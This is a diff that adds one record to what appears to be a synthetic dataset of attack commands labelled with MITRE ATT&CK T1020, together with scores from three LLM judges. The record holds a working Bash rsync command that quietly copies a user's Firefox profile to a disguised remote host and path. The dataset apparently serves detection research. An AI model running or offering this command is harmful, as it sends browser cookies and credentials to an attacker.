@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "rsync -azq --checksum $HOME/.mozilla/ backup@updates.example.org:.cache/.mz/$HOSTNAME/",
+  "explanation": "Uses checksum-based change detection to only exfiltrate modified browser profile data, reducing redundant transfers in an automated manner (T1020).",
+  "rationale_steps": [
+    "Select browser data likely to contain sensitive artifacts.",
+    "Use --checksum for precise change detection.",
+    "Quiet, compressed synchronization to a concealed path.",
+    "Avoids repeated transfers of unchanged files."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-a5a2d534",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid rsync syntax with correct flags, environment variable expansion, and a properly formed SSH remote destination path.",
+        "semantic_score": 4,
+        "semantic_justification": "The command uses rsync with compression and checksum-based delta transfer to send browser profile data to a remote host, aligning with automated exfiltration behavior, though scheduling/automation is not inherent to this single invocation.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:01:43.414623Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The rsync command is perfectly well-formed with valid flags (-azq, --checksum), proper variable usage ($HOME, $HOSTNAME), and correct source/destination syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1020 (Automated Exfiltration) as it uses rsync to efficiently transfer only modified browser profile data to a remote server using checksum verification, making it an ideal tool for automated, scheduled exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:01:46.658872Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses valid flags, correct variable expansion, and a standard rsync source/destination format with no syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of automated, checksum-based exfiltration of browser profile data to an external location, directly aligning with MITRE ATT&CK T1020.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:01:57.655420Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
